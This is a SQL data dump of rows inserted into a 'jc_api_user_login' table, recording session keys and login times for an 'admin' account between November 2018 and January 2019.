INSERT INTO `jc_api_user_login` VALUES (89, 'C3E57A4FE60653A6B97C044ACBEC637B', 'admin', '2018-11-29 14:29:31', 1, '2018-11-29 14:29:31');
INSERT INTO `jc_api_user_login` VALUES (90, '75F362176EBB6765B9ECFC2C332B315D', 'admin', '2018-11-29 14:31:41', 1, '2018-11-29 14:33:23');
INSERT INTO `jc_api_user_login` VALUES (91, '3107D5EA3DBC579B5F80D1F2D732299B', 'admin', '2018-11-29 14:44:48', 1, '2018-11-29 14:48:18');
INSERT INTO `jc_api_user_login` VALUES (92, 'D3841C1E6B8F413BAD725D20F37E8CE0', 'admin', '2018-11-29 14:48:33', 1, '2018-11-29 14:52:51');
INSERT INTO `jc_api_user_login` VALUES (93, 'F0C05D6967AFEAE7F6EA9B035805CB41', 'admin', '2018-11-29 14:59:24', 1, '2018-11-29 14:59:24');
INSERT INTO `jc_api_user_login` VALUES (94, 'E0F06BDF19252CB0A922C61061102893', 'admin', '2018-11-29 15:00:30', 1, '2018-11-29 15:00:40');
INSERT INTO `jc_api_user_login` VALUES (95, '334FC48E22A6FFC99E2F986EAFC201AC', 'admin', '2018-11-29 15:03:47', 1, '2018-11-29 15:03:50');
INSERT INTO `jc_api_user_login` VALUES (96, '3AB927F794C9C60FAF9731E63EFB5DD7', 'admin', '2018-11-29 15:04:51', 1, '2018-11-29 15:22:36');
INSERT INTO `jc_api_user_login` VALUES (97, '6DB5A29B3DC0F460B4BB815EB30B8DA0', 'admin', '2018-11-29 15:27:54', 1, '2018-11-29 15:31:17');
INSERT INTO `jc_api_user_login` VALUES (98, '64DA7D4BD4F919BC79732370E747AFB7', 'admin', '2018-11-29 16:00:34', 1, '2018-11-29 16:11:05');
INSERT INTO `jc_api_user_login` VALUES (99, 'E31850CE873732DA387FBC1D9E6A035B', 'admin', '2018-11-29 16:11:11', 1, '2018-11-29 16:48:43');
INSERT INTO `jc_api_user_login` VALUES (100, 'E23059069923EEF266763556F61CBF1D', 'admin', '2018-11-29 16:50:36', 1, '2018-11-29 16:57:17');
INSERT INTO `jc_api_user_login` VALUES (101, '9E70A97C5416F82552140A201A50B61D', 'admin', '2018-11-29 16:57:25', 1, '2018-11-29 16:57:39');
INSERT INTO `jc_api_user_login` VALUES (102, 'A9302B3FA9F6CE5CC8C75119CB19F12C', 'admin', '2018-11-29 17:02:34', 1, '2018-11-29 17:04:51');
INSERT INTO `jc_api_user_login` VALUES (103, '0130EFD45B3961932016AA20473E2CD9', 'admin', '2018-11-29 17:08:14', 1, '2018-11-29 17:19:34');
INSERT INTO `jc_api_user_login` VALUES (104, '1F837928160D32D0F7A461717519DD8D', 'admin', '2018-11-29 17:19:40', 1, '2018-11-29 17:26:51');
INSERT INTO `jc_api_user_login` VALUES (105, '642396C856F9619801584A264F7B5873', 'admin', '2018-11-30 09:57:10', 1, '2018-11-30 11:25:20');
INSERT INTO `jc_api_user_login` VALUES (106, '5B701882A575E390BCD3E72B5A719B50', 'admin', '2018-11-30 13:34:09', 1, '2018-11-30 14:08:03');
INSERT INTO `jc_api_user_login` VALUES (107, 'E2329915DBA2460B7CB0765A7C960162', 'admin', '2018-11-30 14:21:40', 1, '2018-11-30 16:32:47');
INSERT INTO `jc_api_user_login` VALUES (108, '69C0AF904B14DD381F8CAE6D5BFD6281', 'admin', '2018-12-03 09:53:52', 1, '2018-12-03 09:53:52');
INSERT INTO `jc_api_user_login` VALUES (109, '08267A43BEA5A22389CADAB9B777BEB3', 'admin', '2018-12-03 10:18:08', 1, '2018-12-03 10:18:12');
INSERT INTO `jc_api_user_login` VALUES (110, '0ABF561540F10A6E99D084C72360BEFD', 'admin', '2018-12-03 15:07:53', 1, '2018-12-03 15:26:59');
INSERT INTO `jc_api_user_login` VALUES (111, 'B082BDEC3EAF5B4E0A9F8B898EA8B4F9', 'admin', '2018-12-03 17:19:57', 1, '2018-12-03 17:34:30');
INSERT INTO `jc_api_user_login` VALUES (112, 'DA9FEA11E68C85503BDAF53BEFB0AD14', 'admin', '2018-12-04 11:14:07', 1, '2018-12-04 11:49:27');
INSERT INTO `jc_api_user_login` VALUES (113, 'E88CBE6C5B973DA78472E59B51810689', 'admin', '2018-12-06 13:55:49', 1, '2018-12-06 13:55:49');
INSERT INTO `jc_api_user_login` VALUES (114, 'A4F747015A6F5B0A5B41959FE22675F7', 'admin', '2018-12-07 11:10:21', 1, '2018-12-07 11:20:04');
INSERT INTO `jc_api_user_login` VALUES (115, 'D1F48E13BA63608EF2F882548E839F5F', 'admin', '2018-12-07 11:22:23', 1, '2018-12-07 11:22:24');
INSERT INTO `jc_api_user_login` VALUES (116, 'F83E4F55AC8934A9C282AB006D4B82B4', 'admin', '2018-12-07 11:24:52', 1, '2018-12-07 11:26:10');
INSERT INTO `jc_api_user_login` VALUES (117, 'C88CFFF32B0E25E6688F1738BA3A9BB6', 'admin', '2018-12-07 11:26:14', 1, '2018-12-07 11:42:33');
INSERT INTO `jc_api_user_login` VALUES (118, 'DD3F469CE7368833BF6B34B7516E3E27', 'admin', '2018-12-07 13:41:19', 1, '2018-12-07 13:41:20');
INSERT INTO `jc_api_user_login` VALUES (119, '06E4B75855795C82E8020EDDC48348CD', 'admin', '2018-12-07 13:57:36', 1, '2018-12-07 13:58:19');
INSERT INTO `jc_api_user_login` VALUES (120, '087E27B869440676E82E4A45FD9209DF', 'admin', '2018-12-07 14:30:27', 1, '2018-12-07 14:30:28');
INSERT INTO `jc_api_user_login` VALUES (121, '3100F13EB333560DC408DEF351DAEC9B', 'admin', '2018-12-07 14:30:53', 1, '2018-12-07 14:38:40');
INSERT INTO `jc_api_user_login` VALUES (122, 'C7DE55A907CDBE9B9E288B8FC2DFB3BB', 'admin', '2018-12-07 14:44:27', 1, '2018-12-07 14:47:22');
INSERT INTO `jc_api_user_login` VALUES (123, 'CBE881C033EF7314C93109AB62818BDA', 'admin', '2018-12-07 15:51:43', 1, '2018-12-07 15:53:29');
INSERT INTO `jc_api_user_login` VALUES (124, '536D459876A51F0525A72E658993936D', 'admin', '2018-12-07 16:31:29', 1, '2018-12-07 16:54:11');
INSERT INTO `jc_api_user_login` VALUES (125, '8E76191492E512EAC407A7E1B47AF886', 'admin', '2018-12-07 17:03:16', 1, '2018-12-07 17:03:21');
INSERT INTO `jc_api_user_login` VALUES (126, '32C6613997D7C56E1BAE167CBC60FA22', 'admin', '2018-12-07 17:33:21', 1, '2018-12-07 17:33:21');
INSERT INTO `jc_api_user_login` VALUES (127, '50ED5DC87AF6EF1BDC361C0F33B8EAE2', 'admin', '2018-12-07 17:33:58', 1, '2018-12-07 17:33:59');
INSERT INTO `jc_api_user_login` VALUES (128, '97D3D74A8F0C97260CB122FD9FE41ABE', 'admin', '2018-12-07 17:34:08', 1, '2018-12-07 17:34:09');
INSERT INTO `jc_api_user_login` VALUES (129, 'F93CBB72FD63B4A6433807474544B0F3', 'admin', '2018-12-10 09:31:49', 1, '2018-12-10 09:33:49');
INSERT INTO `jc_api_user_login` VALUES (130, '6EA01D85F03700BD7E42305285EC261E', 'admin', '2018-12-10 10:36:34', 1, '2018-12-10 10:36:35');
INSERT INTO `jc_api_user_login` VALUES (131, 'B44416C21AAA93CEB89A5CA7204F9204', 'admin', '2018-12-10 11:07:13', 1, '2018-12-10 11:14:53');
INSERT INTO `jc_api_user_login` VALUES (132, 'D6E1C4AAAE0DB46246797700EB53CF00', 'admin', '2018-12-10 11:15:24', 1, '2018-12-10 11:15:25');
INSERT INTO `jc_api_user_login` VALUES (133, '8DC233AC9A35EDB984F838E24B875658', 'admin', '2018-12-10 11:22:27', 1, '2018-12-10 11:22:27');
INSERT INTO `jc_api_user_login` VALUES (134, '063852AC6170D0956A975B160B372F02', 'admin', '2018-12-10 11:32:05', 1, '2018-12-10 11:32:21');
INSERT INTO `jc_api_user_login` VALUES (135, '4AB287A22D2BE2F33432FA082BB3A36D', 'admin', '2018-12-10 14:36:44', 1, '2018-12-10 14:37:13');
INSERT INTO `jc_api_user_login` VALUES (136, '381C7374633242882FBBBC99665DD6F8', 'admin', '2018-12-10 14:43:51', 1, '2018-12-10 14:56:49');
INSERT INTO `jc_api_user_login` VALUES (137, '8685710B8C7793F037A76355FCB96FCB', 'admin', '2018-12-10 14:58:13', 1, '2018-12-10 14:58:21');
INSERT INTO `jc_api_user_login` VALUES (138, 'B28401F870F6E156BBB4D00B7AD58C84', 'admin', '2018-12-10 15:01:32', 1, '2018-12-10 15:01:46');
INSERT INTO `jc_api_user_login` VALUES (139, 'BDF49762379C4CA3C197865EAF54A49A', 'admin', '2018-12-10 15:30:27', 1, '2018-12-10 15:30:35');
INSERT INTO `jc_api_user_login` VALUES (140, 'CBBCA7D35A41D74919E6D349CC06BDE2', 'admin', '2018-12-10 15:54:15', 1, '2018-12-10 15:54:18');
INSERT INTO `jc_api_user_login` VALUES (141, '4CD184C1F8F470EEDE8DC9E23B695DE8', 'admin', '2018-12-10 15:59:13', 1, '2018-12-10 15:59:23');
INSERT INTO `jc_api_user_login` VALUES (142, 'BFC20DFB8DF5063198A3C52290F06459', 'admin', '2018-12-10 16:06:22', 1, '2018-12-10 16:06:23');
INSERT INTO `jc_api_user_login` VALUES (143, '913ADB41A570C088E6BC1A615C5AB08E', 'admin', '2018-12-10 16:10:56', 1, '2018-12-10 16:10:57');
INSERT INTO `jc_api_user_login` VALUES (144, '784655715B1DADA2B7FF952C7EC679A1', 'admin', '2018-12-10 16:16:01', 1, '2018-12-10 16:16:01');
INSERT INTO `jc_api_user_login` VALUES (145, '9DF2F500F95135DC9CDDEE6525850ED9', 'admin', '2018-12-10 16:16:34', 1, '2018-12-10 16:16:45');
INSERT INTO `jc_api_user_login` VALUES (146, 'FE8E247C924ED6AE20B8F2771385C53E', 'admin', '2018-12-10 16:22:55', 1, '2018-12-10 16:23:54');
INSERT INTO `jc_api_user_login` VALUES (147, 'BD1EB346A6B226BB97EBD35C42FB8945', 'admin', '2018-12-10 16:26:38', 1, '2018-12-10 16:26:39');
INSERT INTO `jc_api_user_login` VALUES (148, 'C2AC49046C86BB2489DD3CFC6B93C905', 'admin', '2018-12-10 16:29:03', 1, '2018-12-10 16:29:03');
INSERT INTO `jc_api_user_login` VALUES (149, '8528ACFA6F84EEA28E1E08EB353F983F', 'admin', '2018-12-10 16:46:24', 1, '2018-12-10 16:46:24');
INSERT INTO `jc_api_user_login` VALUES (150, '92AA17D7133175B5F6F48C663D73142D', 'admin', '2018-12-10 16:57:34', 1, '2018-12-10 16:57:38');
INSERT INTO `jc_api_user_login` VALUES (151, '9801081379321B068A009D02FE8759C3', 'admin', '2018-12-10 17:11:41', 1, '2018-12-10 17:12:20');
INSERT INTO `jc_api_user_login` VALUES (152, 'CD648D2CB2B0763F564F52DB31DE6781', 'admin', '2018-12-10 17:18:58', 1, '2018-12-10 17:18:58');
INSERT INTO `jc_api_user_login` VALUES (153, '3692DF686BF56D31F6AFAE7B9E05EAB7', 'admin', '2018-12-10 17:22:07', 1, '2018-12-10 17:22:22');
INSERT INTO `jc_api_user_login` VALUES (154, '899AF097B010349412F40616B015F6F0', 'admin', '2018-12-10 17:23:13', 1, '2018-12-10 17:23:13');
INSERT INTO `jc_api_user_login` VALUES (155, '6254960B9B5618A8CF83658796F85A0C', 'admin', '2018-12-11 10:23:58', 1, '2018-12-11 10:24:31');
INSERT INTO `jc_api_user_login` VALUES (156, '316C58BABA64ACCC28B023C5CC3C92D9', 'admin', '2018-12-11 10:27:35', 1, '2018-12-11 10:39:53');
INSERT INTO `jc_api_user_login` VALUES (157, '093DA2C733C4D023B9B696E36FC09DFA', 'admin', '2018-12-11 11:03:43', 1, '2018-12-11 11:09:18');
INSERT INTO `jc_api_user_login` VALUES (158, 'C15B949D6361517DD484DDA09576AEF5', 'admin', '2018-12-11 11:11:01', 1, '2018-12-11 11:20:58');
INSERT INTO `jc_api_user_login` VALUES (159, '21341943BA7D60687DB2F17507DCCA04', 'admin', '2018-12-11 13:43:33', 1, '2018-12-11 13:44:44');
INSERT INTO `jc_api_user_login` VALUES (160, '639E77FC00C8841E9BCEBC2CD4F495CC', 'admin', '2018-12-11 14:15:59', 1, '2018-12-11 14:19:00');
INSERT INTO `jc_api_user_login` VALUES (161, '3CC95CEF1FACCEFF7A496DFB368B197D', 'admin', '2018-12-11 14:28:26', 1, '2018-12-11 14:28:30');
INSERT INTO `jc_api_user_login` VALUES (162, '56F1FC190D039E3733B90BB289307433', 'admin', '2018-12-11 14:30:29', 1, '2018-12-11 14:53:49');
INSERT INTO `jc_api_user_login` VALUES (163, '079CF4AEB4A8512262D78A9105984B66', 'admin', '2018-12-11 15:04:53', 1, '2018-12-11 15:18:08');
INSERT INTO `jc_api_user_login` VALUES (164, 'C334AE9F1C1C45B9C13FA06E91E65595', 'admin', '2018-12-25 14:12:13', 1, '2018-12-25 14:18:25');
INSERT INTO `jc_api_user_login` VALUES (165, '66C5794A35EBBAA9172D5DEFA7B57C89', 'admin', '2018-12-25 16:24:28', 1, '2018-12-25 17:17:23');
INSERT INTO `jc_api_user_login` VALUES (166, 'F1902FC77252F6413A1E9CE3BCA4095C', 'admin', '2018-12-25 17:22:14', 1, '2018-12-25 17:33:01');
INSERT INTO `jc_api_user_login` VALUES (167, '62301F4E83D56DB58C429DC93C1A01A2', 'admin', '2018-12-26 09:50:24', 1, '2018-12-26 09:50:57');
INSERT INTO `jc_api_user_login` VALUES (168, '8986E27915BA7E0C365D5358AD3F8257', 'admin', '2018-12-26 09:54:53', 1, '2018-12-26 10:01:47');
INSERT INTO `jc_api_user_login` VALUES (169, 'FB813E9E84A02A510FC4A32820D4D0AF', 'admin', '2018-12-26 10:33:29', 1, '2018-12-26 10:33:38');
INSERT INTO `jc_api_user_login` VALUES (170, 'B1009A49C619D116695767DDDCD63983', 'admin', '2018-12-26 10:34:43', 1, '2018-12-26 10:34:47');
INSERT INTO `jc_api_user_login` VALUES (171, '7B580D77106049AED10611B6D4625AFE', 'admin', '2018-12-26 13:38:39', 1, '2018-12-26 13:39:18');
INSERT INTO `jc_api_user_login` VALUES (172, '69213C6DE7A3F09AA6B94DB152566CCA', 'admin', '2018-12-26 13:39:33', 1, '2018-12-26 14:11:23');
INSERT INTO `jc_api_user_login` VALUES (173, '8C5F18AE0A8755B6C835BE7078880C7E', 'admin', '2018-12-26 14:24:53', 1, '2018-12-26 14:25:00');
INSERT INTO `jc_api_user_login` VALUES (175, '6CDBADABE8574ED9C6E0A0098FDC41D3', 'admin', '2018-12-26 15:33:17', 1, '2018-12-26 15:33:41');
INSERT INTO `jc_api_user_login` VALUES (176, '627E7F9C00E4CADBFDB037076D4AD15D', 'admin', '2018-12-26 15:51:37', 1, '2018-12-26 15:51:51');
INSERT INTO `jc_api_user_login` VALUES (177, '8E3FFA94F56871A32EF597B5FF5BAEBF', 'admin', '2018-12-26 16:53:04', 1, '2018-12-26 17:08:10');
INSERT INTO `jc_api_user_login` VALUES (178, '09C8F3AFB348795658879E3DF938860E', 'admin', '2018-12-26 17:24:16', 1, '2018-12-26 17:24:57');
INSERT INTO `jc_api_user_login` VALUES (179, '63FC094DC2E8BF4A3E897F4D57534EFB', 'admin', '2018-12-26 17:25:07', 1, '2018-12-26 17:25:08');
INSERT INTO `jc_api_user_login` VALUES (180, '93A0F3FECAC7DED4D88D8A08E0B338E5', 'admin', '2018-12-26 17:30:45', 1, '2018-12-26 17:30:53');
INSERT INTO `jc_api_user_login` VALUES (181, 'DCF48ADF4825923E844AAEFA6C1CAD9A', 'admin', '2018-12-26 17:36:36', 1, '2018-12-26 17:36:36');
INSERT INTO `jc_api_user_login` VALUES (182, 'B3DC10D1ED1C38A149C5ABC2A3B9A559', 'admin', '2018-12-26 17:36:58', 1, '2018-12-26 17:37:58');
INSERT INTO `jc_api_user_login` VALUES (183, '5801FEA36D703205A0AC82BB19B9F851', 'admin', '2018-12-27 09:30:53', 1, '2018-12-27 09:34:04');
INSERT INTO `jc_api_user_login` VALUES (184, 'E442CF9F701860898D432BEEB4866F52', 'admin', '2018-12-27 09:34:10', 1, '2018-12-27 09:34:10');
INSERT INTO `jc_api_user_login` VALUES (185, '43D20A358C1AA5DF5CE9691525B73325', 'admin', '2018-12-27 09:37:53', 1, '2018-12-27 09:39:05');
INSERT INTO `jc_api_user_login` VALUES (186, '3C417C8881708532701AA913CD8146D1', 'admin', '2018-12-27 10:21:02', 1, '2018-12-27 10:22:12');
INSERT INTO `jc_api_user_login` VALUES (187, 'DE1BCE5F0B35EFCD9FA3CF59EC55B110', 'admin', '2018-12-27 10:22:22', 1, '2018-12-27 10:38:55');
INSERT INTO `jc_api_user_login` VALUES (188, 'FD5FC7A5F83FCCFC557AF74799D3A945', 'admin', '2018-12-27 10:40:08', 1, '2018-12-27 10:53:15');
INSERT INTO `jc_api_user_login` VALUES (189, '0BCFC23DB69DAF192007A2BF48990B92', 'admin', '2018-12-27 11:00:13', 1, '2018-12-27 11:02:16');
INSERT INTO `jc_api_user_login` VALUES (190, 'AF0487D0A4DD32B2481E4937CFDB3D46', 'admin', '2018-12-27 11:02:26', 1, '2018-12-27 11:02:29');
INSERT INTO `jc_api_user_login` VALUES (191, 'B693DEB0F7E72F34ABC6EEEC48D1891F', 'admin', '2018-12-27 11:06:55', 1, '2018-12-27 11:06:58');
INSERT INTO `jc_api_user_login` VALUES (192, 'E59E96B01667438781AC3B9B8D11C852', 'admin', '2018-12-27 11:16:58', 1, '2018-12-27 11:17:01');
INSERT INTO `jc_api_user_login` VALUES (193, 'CB022658B4A5197A7BF7C35F279D10B1', 'admin', '2018-12-27 11:19:51', 1, '2018-12-27 11:26:48');
INSERT INTO `jc_api_user_login` VALUES (194, '3CED48712BFE79FD4585E325CA261C3C', 'admin', '2018-12-27 13:45:13', 1, '2018-12-27 13:45:42');
INSERT INTO `jc_api_user_login` VALUES (195, 'E88361F0D7124839E84CF80AA3DAEC4B', 'admin', '2018-12-27 13:45:48', 1, '2018-12-27 13:46:23');
INSERT INTO `jc_api_user_login` VALUES (196, '0F555C19F176F03BECDDE425111EC15E', 'admin', '2018-12-27 13:46:29', 1, '2018-12-27 13:46:34');
INSERT INTO `jc_api_user_login` VALUES (197, '43A2DE0454030D1C9FD6E155D6158C46', 'admin', '2018-12-27 13:48:16', 1, '2018-12-27 13:56:43');
INSERT INTO `jc_api_user_login` VALUES (198, 'BA60409F60DF1EA01172D47909975F96', 'admin', '2018-12-27 13:58:03', 1, '2018-12-27 14:15:32');
INSERT INTO `jc_api_user_login` VALUES (199, '74205A170520BA8BC337F29B4CBA6C8D', 'admin', '2018-12-27 14:23:16', 1, '2018-12-27 14:23:20');
INSERT INTO `jc_api_user_login` VALUES (200, 'B4256E92B87158C8699D83E3506C6604', 'admin', '2018-12-27 14:24:30', 1, '2018-12-27 14:27:38');
INSERT INTO `jc_api_user_login` VALUES (201, '7D506C4C8F10FF87648BA74E3BFC0209', 'admin', '2018-12-27 14:27:43', 1, '2018-12-27 14:41:22');
INSERT INTO `jc_api_user_login` VALUES (202, '5B6A1232C421BD2B412BB0642913C4FA', 'admin', '2018-12-27 14:41:32', 1, '2018-12-27 14:44:53');
INSERT INTO `jc_api_user_login` VALUES (203, '5AE216414E8393ABD0F2D26929F177CF', 'admin', '2018-12-27 14:45:12', 1, '2018-12-27 14:52:56');
INSERT INTO `jc_api_user_login` VALUES (204, '13AD9D2E6945BEEE2368CFCA9FF0C595', 'admin', '2018-12-27 14:54:19', 1, '2018-12-27 15:04:10');
INSERT INTO `jc_api_user_login` VALUES (205, 'B3BB017030B80C4B27F8897043BA1936', 'admin', '2018-12-27 15:04:58', 1, '2018-12-27 15:26:45');
INSERT INTO `jc_api_user_login` VALUES (206, '9190C947EB9324F3365226D12B1BC638', 'admin', '2018-12-27 16:35:42', 1, '2018-12-27 17:07:35');
INSERT INTO `jc_api_user_login` VALUES (207, '5EFFD74E5BCFDA0B0CCDCF91145D8ABA', 'admin', '2018-12-28 14:31:44', 1, '2018-12-28 14:31:44');
INSERT INTO `jc_api_user_login` VALUES (208, '65125BB1C1A6145342C651BF0CEC1E09', 'admin', '2018-12-28 14:31:48', 1, '2018-12-28 14:31:48');
INSERT INTO `jc_api_user_login` VALUES (209, '7ACD501726E4FA3AD354FDB3A42D94F9', 'admin', '2018-12-28 14:31:57', 1, '2018-12-28 14:31:57');
INSERT INTO `jc_api_user_login` VALUES (210, 'A35E6258585137B0A16A0B5E7D34B625', 'admin', '2018-12-28 14:32:32', 1, '2018-12-28 14:32:32');
INSERT INTO `jc_api_user_login` VALUES (211, 'BC5713BBE7EC3E5ECC81687FC47967D3', 'admin', '2018-12-28 14:33:37', 1, '2018-12-28 14:33:37');
INSERT INTO `jc_api_user_login` VALUES (212, 'F5254DB9CA3EA714BDCAFE5C0CC15C05', 'admin', '2018-12-28 14:35:44', 1, '2018-12-28 14:35:44');
INSERT INTO `jc_api_user_login` VALUES (213, '350E5AEC32D8FD7A7EEC51DE1204FD46', 'admin', '2018-12-28 14:36:53', 1, '2018-12-28 14:36:53');
INSERT INTO `jc_api_user_login` VALUES (214, '0E7A0151BDCC0845E8A2EE89A02ADC30', 'admin', '2018-12-28 14:37:51', 1, '2018-12-28 14:37:51');
INSERT INTO `jc_api_user_login` VALUES (215, 'E08251D8F11ADAFE6DC18B042EA7FD40', 'admin', '2018-12-28 14:39:19', 1, '2018-12-28 14:39:19');
INSERT INTO `jc_api_user_login` VALUES (216, '680933C73721B208E558E2E5CFB0F1C1', 'admin', '2018-12-28 14:43:26', 1, '2018-12-28 15:05:06');
INSERT INTO `jc_api_user_login` VALUES (217, 'FD4295A3353CF2ABE9509738951AA931', 'admin', '2018-12-28 15:08:27', 1, '2018-12-28 15:08:27');
INSERT INTO `jc_api_user_login` VALUES (218, '180165C65400C52CE380E7E48C810F0B', 'admin', '2018-12-28 15:08:34', 1, '2018-12-28 15:08:34');
INSERT INTO `jc_api_user_login` VALUES (219, '0ABFB4E8F511BD85BCDB5763791B94D0', 'admin', '2018-12-28 15:10:24', 1, '2018-12-28 15:10:24');
INSERT INTO `jc_api_user_login` VALUES (220, '1AF50FFA9F8B7E463133989102FFC512', 'admin', '2018-12-28 15:10:33', 1, '2018-12-28 15:10:33');
INSERT INTO `jc_api_user_login` VALUES (221, 'F35D0DC4128CE67DECDA236E6AAEAFB6', 'admin', '2018-12-28 15:11:49', 1, '2018-12-28 15:11:49');
INSERT INTO `jc_api_user_login` VALUES (222, '4413E30E903B30E55BEBB2AE0178B524', 'admin', '2018-12-28 15:11:56', 1, '2018-12-28 15:12:42');
INSERT INTO `jc_api_user_login` VALUES (223, '5DAD83B3025A73FD9A6F8A69B574560B', 'admin', '2018-12-28 15:15:21', 1, '2018-12-28 15:15:21');
INSERT INTO `jc_api_user_login` VALUES (224, 'BABFC5F5B00435D63FD75B9F5F99D9E0', 'admin', '2018-12-28 15:16:21', 1, '2018-12-28 15:16:21');
INSERT INTO `jc_api_user_login` VALUES (225, 'D98662A997BFDDA2FE736A67D6CE7C5A', 'admin', '2018-12-28 15:16:48', 1, '2018-12-28 15:16:48');
INSERT INTO `jc_api_user_login` VALUES (226, 'D171B1D5DBC9254FCEC032A380A73A2D', 'admin', '2018-12-28 15:18:25', 1, '2018-12-28 15:18:25');
INSERT INTO `jc_api_user_login` VALUES (227, '1EBCA02F81739582A7C616F7DB2ABBD8', 'admin', '2018-12-28 15:18:43', 1, '2018-12-28 15:18:44');
INSERT INTO `jc_api_user_login` VALUES (228, 'D2E009447390233F39C121851E59DE0B', 'admin', '2018-12-28 15:19:48', 1, '2018-12-28 15:21:52');
INSERT INTO `jc_api_user_login` VALUES (229, 'D40CDC1F7241E5D950E8428AA43FD50C', 'admin', '2018-12-28 15:22:36', 1, '2018-12-28 15:41:57');
INSERT INTO `jc_api_user_login` VALUES (230, 'A292827EA1B1B8DBBB0AB6BFB5D9763C', 'admin', '2018-12-28 15:48:14', 1, '2018-12-28 15:48:14');
INSERT INTO `jc_api_user_login` VALUES (231, 'AE2CCEB34F5A6E83F7BBD7BCD62FEC79', 'admin', '2018-12-28 15:48:21', 1, '2018-12-28 15:48:21');
INSERT INTO `jc_api_user_login` VALUES (232, 'BC4C020049950035565E5FE58031C13D', 'admin', '2018-12-28 15:49:21', 1, '2018-12-28 15:49:21');
INSERT INTO `jc_api_user_login` VALUES (233, '53E2073A5E4246239C22EE483900DEB3', 'admin', '2018-12-28 15:50:21', 1, '2018-12-28 16:11:44');
INSERT INTO `jc_api_user_login` VALUES (234, '866E097D24BD7F79D3CA9E756D39249F', 'admin', '2018-12-28 16:20:34', 1, '2018-12-28 16:36:56');
INSERT INTO `jc_api_user_login` VALUES (235, 'BE3C560C862A934EF5F39A7E8B443E54', 'admin', '2018-12-28 16:51:42', 1, '2018-12-28 17:02:45');
INSERT INTO `jc_api_user_login` VALUES (236, '1D46379EF2D5DB9607059857FF9137B3', 'admin', '2018-12-28 17:02:57', 1, '2018-12-28 17:31:12');
INSERT INTO `jc_api_user_login` VALUES (237, '591A3829399B159F2FEFEE78BD826619', 'admin', '2018-12-29 09:36:32', 1, '2018-12-29 09:36:33');
INSERT INTO `jc_api_user_login` VALUES (238, '89C82B178807A0436DF2960D57FEB8A5', 'admin', '2018-12-29 09:41:26', 1, '2018-12-29 09:41:35');
INSERT INTO `jc_api_user_login` VALUES (239, '65BE253120D31849AFE3DB34E2A37C15', 'admin', '2018-12-29 09:42:03', 1, '2018-12-29 09:42:08');
INSERT INTO `jc_api_user_login` VALUES (240, '881983E4193D92818C345205CEF66293', 'admin', '2018-12-29 09:55:43', 1, '2018-12-29 09:55:43');
INSERT INTO `jc_api_user_login` VALUES (241, 'BCD89CF01BB74BDBD0D9F3B7C1D0C885', 'admin', '2018-12-29 09:56:23', 1, '2018-12-29 09:56:23');
INSERT INTO `jc_api_user_login` VALUES (242, 'EFAD8057EB9CB3B7B80326FFB9C2AF29', 'admin', '2018-12-29 10:12:26', 1, '2018-12-29 10:12:27');
INSERT INTO `jc_api_user_login` VALUES (243, 'D46C19BF00778FB4818B47574EE600CE', 'admin', '2018-12-29 10:22:19', 1, '2018-12-29 10:22:57');
INSERT INTO `jc_api_user_login` VALUES (244, 'C0C595395C6E8B8C4F3E0B247514E082', 'admin', '2018-12-29 10:35:29', 1, '2018-12-29 10:36:29');
INSERT INTO `jc_api_user_login` VALUES (245, '04007C21AABBC94BFDEE4EA7F5F30FF1', 'admin', '2018-12-29 10:39:02', 1, '2018-12-29 10:39:38');
INSERT INTO `jc_api_user_login` VALUES (246, 'C1397DA2AC6E19F1BEF7475974BBAAB2', 'admin', '2018-12-29 11:00:00', 1, '2018-12-29 11:00:02');
INSERT INTO `jc_api_user_login` VALUES (247, '9DDCC97A4B6E04D9A3DDD5FF250C739D', 'admin', '2018-12-29 11:01:59', 1, '2018-12-29 11:02:00');
INSERT INTO `jc_api_user_login` VALUES (248, 'D11F897479B5FC039CA8215336CDD55C', 'admin', '2018-12-29 11:04:44', 1, '2018-12-29 11:04:44');
INSERT INTO `jc_api_user_login` VALUES (249, '568CE98ED55EFC7B12815E41E74130FB', 'admin', '2018-12-29 11:04:48', 1, '2018-12-29 11:04:48');
INSERT INTO `jc_api_user_login` VALUES (250, '9B72C4739A7DBD374544FE3B924AC386', 'admin', '2018-12-29 11:07:41', 1, '2018-12-29 11:08:00');
INSERT INTO `jc_api_user_login` VALUES (251, '6ED6E83C1651C1D5A43861329F9874C3', 'admin', '2018-12-29 11:08:37', 1, '2018-12-29 11:09:40');
INSERT INTO `jc_api_user_login` VALUES (252, '7ACACE31B19A59FDF58D2C963736DDCB', 'admin', '2018-12-29 11:17:39', 1, '2018-12-29 11:17:42');
INSERT INTO `jc_api_user_login` VALUES (253, 'EC160E5AAF132EE9EEE85E5D028252D0', 'admin', '2018-12-29 11:18:06', 1, '2018-12-29 11:18:12');
INSERT INTO `jc_api_user_login` VALUES (254, '145A0D86D35E910E55BD7980A3413809', 'admin', '2018-12-29 11:18:44', 1, '2018-12-29 11:18:51');
INSERT INTO `jc_api_user_login` VALUES (255, '9C55C11D5ED4FF1BD2693A92F5F0BF9A', 'admin', '2019-01-02 09:30:43', 1, '2019-01-02 09:53:26');
INSERT INTO `jc_api_user_login` VALUES (256, '41571320C063BA2E5A600444488DF151', 'admin', '2019-01-02 09:53:32', 1, '2019-01-02 09:59:43');
INSERT INTO `jc_api_user_login` VALUES (257, 'A736A9A79CAD5B8356D0CA8A8303E0C5', 'admin', '2019-01-02 10:02:56', 1, '2019-01-02 10:13:00');
INSERT INTO `jc_api_user_login` VALUES (258, 'F3F44DC2313AACAB9144E48C9810A628', 'admin', '2019-01-02 10:15:45', 1, '2019-01-02 10:16:27');
INSERT INTO `jc_api_user_login` VALUES (259, '415A67D8870A3B3A4DF2E1EE48ACAF9F', 'admin', '2019-01-02 10:27:47', 1, '2019-01-02 10:28:10');
INSERT INTO `jc_api_user_login` VALUES (260, '839769A441928B6475D229264E40A3A9', 'admin', '2019-01-02 10:30:57', 1, '2019-01-02 10:30:58');
INSERT INTO `jc_api_user_login` VALUES (261, '6C7F8C503344C8B8B5CC09861980D43A', 'admin', '2019-01-02 10:41:51', 1, '2019-01-02 10:45:55');
INSERT INTO `jc_api_user_login` VALUES (262, 'F1DF00558023D96FB3A45D91BA407D90', 'admin', '2019-01-02 10:49:25', 1, '2019-01-02 10:55:07');
INSERT INTO `jc_api_user_login` VALUES (263, '0358D94FC2861AA11432C5D1FE69E1E5', 'admin', '2019-01-02 11:15:02', 1, '2019-01-02 11:15:02');
INSERT INTO `jc_api_user_login` VALUES (264, '833A5F076E3CDA0371CBADAE208416AF', 'admin', '2019-01-02 11:15:18', 1, '2019-01-02 11:15:18');
